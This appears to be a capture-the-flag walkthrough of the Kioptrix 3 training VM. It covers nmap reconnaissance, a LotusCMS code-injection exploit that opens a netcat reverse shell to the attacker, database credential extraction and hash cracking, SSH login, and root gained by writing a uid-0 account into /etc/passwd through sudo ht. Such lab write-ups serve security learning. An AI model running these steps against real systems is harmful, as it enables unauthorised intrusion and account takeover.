@@ -1,0 +1,236 @@
+IP - 10.0.2.25
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+nmap result
+
+┌──(root㉿kali)-[~/Desktop/vulhub/KioptrixVM3]
+└─# nmap -sC -sV 10.0.2.25 -p- -oN nmap_all_port.txt
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 23:30 +0630
+Nmap scan report for kioptrix3.com (10.0.2.25)
+Host is up (0.00010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30e3f6dc2e225d17ac460239ad71cb49 (DSA)
+|_  2048 9a82e696e47ed6a6d74544cb19aaecdd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|_http-title: Ligoat Security - Got Goat? Security ...
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+MAC Address: 08:00:27:98:26:FB (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Found LotusCMS at http://kioptrix3.com/index.php?system=Admin
+
+I research about that cms exploit and found RCE exploit:
+
+https://github.com/Hood3dRob1n/LotusCMS-Exploit
+
+So, I download it and exploit it:
+
+./exploit.sh kioptrix3.com /
+
+Path found, now to check for vuln....
+
+</html>Hood3dRob1n
+Regex found, site is vulnerable to PHP Code Injection!
+
+About to try and inject reverse shell....
+what IP to use?
+10.0.2.4
+What PORT?
+4444
+
+OK, open your local listener and choose the method for back connect: 
+1) NetCat -e
+2) NetCat /dev/tcp
+3) NetCat Backpipe
+4) NetCat FIFO
+5) Exit
+#? 1
+
+
+Need to listen with nc:
+
+nc -lvnp 4444
+
+Boom! I got reverse shell
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+After running linpeas.sh, I found database password:
+
+╔══════════╣ Searching passwords in config PHP files
+        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";                                                                                                 
+$cfg['Servers'][$i]['nopassword'] = false;
+$cfg['ShowChgPassword'] = false;
+
+password = fuckeyou
+
+I login into mysql with above password:
+
+www-data@Kioptrix3:/tmp$ mysql -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 38
+Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
+
+Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+
+mysql>
+
+Found "loneferret" MD5 hash password:
+
+mysql> select * from dev_accounts;
++----+------------+----------------------------------+
+| id | username   | password                         |
++----+------------+----------------------------------+
+|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | 
+|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 
++----+------------+----------------------------------+
+2 rows in set (0.00 sec)
+
+
+Decrypted Version Of "loneferret" password:
+
+password - starwars
+
+
+I already found that user loneferret has ssh login so I tried login with:
+
+Username - loneferret
+Password - starwars
+
+Boom! I got user access.
+
+┌──(root㉿kali)-[~]
+└─# ssh loneferret@10.0.2.25 -oHostKeyAlgorithms=+ssh-dss
+loneferret@10.0.2.25's password: 
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
+loneferret@Kioptrix3:~$ whoami
+loneferret
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation 
+
+I execute sudo -l with user loneferret. Found that we can use ht editor as root with no password:
+
+loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+
+
+So, I add new user lol as root priv:
+
+1st step:
+
+Generate openssl key:
+
+┌──(root㉿kali)-[~/Desktop/tools/linPEAS]
+└─# openssl passwd -1 -salt lol pass123  
+$1$lol$KiPrOjhyjfhWUcIJnDuJd/
+
+
+
+2nd step:
+
+added into /etc/passwd with ht editor
+
+loneferret@Kioptrix3:~$ sudo ht
+
+Press F3 to open file
+
+find and open /etc/passwd
+
+add below code at the end of the line:
+
+lol:$1$lol$KiPrOjhyjfhWUcIJnDuJd/:0:0:/root/root:/bin/bash
+
+Then press F2 for save file
+
+Ctrl+C for exit editor.
+
+Final Step:
+
+loneferret@Kioptrix3:~$ su lol
+Password:pass123
+# whoami
+root
+
+Final Flag:
+
+root@Kioptrix3:/root# cat Congrats.txt 
+Good for you for getting here.
+Regardless of the matter (staying within the spirit of the game of course)
+you got here, congratulations are in order. Wasn't that bad now was it.
+
+Went in a different direction with this VM. Exploit based challenges are
+nice. Helps workout that information gathering part, but sometimes we
+need to get our hands dirty in other things as well.
+Again, these VMs are beginner and not intented for everyone. 
+Difficulty is relative, keep that in mind.
+
+The object is to learn, do some research and have a little (legal)
+fun in the process.
+
+
+I hope you enjoyed this third challenge.
+
+Steven McElrea
+aka loneferret
+http://www.kioptrix.com
+
+
+Credit needs to be given to the creators of the gallery webapp and CMS used
+for the building of the Kioptrix VM3 site.
+
+Main page CMS: 
+http://www.lotuscms.org
+
+Gallery application: 
+Gallarific 2.1 - Free Version released October 10, 2009
+http://www.gallarific.com
+Vulnerable version of this application can be downloaded
+from the Exploit-DB website:
+http://www.exploit-db.com/exploits/15891/
+
+The HT Editor can be found here:
+http://hte.sourceforge.net/downloads.html
+And the vulnerable version on Exploit-DB here:
+http://www.exploit-db.com/exploits/17083/
+
+
+Also, all pictures were taken from Google Images, so being part of the
+public domain I used them.
+
+root@Kioptrix3:/root#
+
+
+
+
+
+
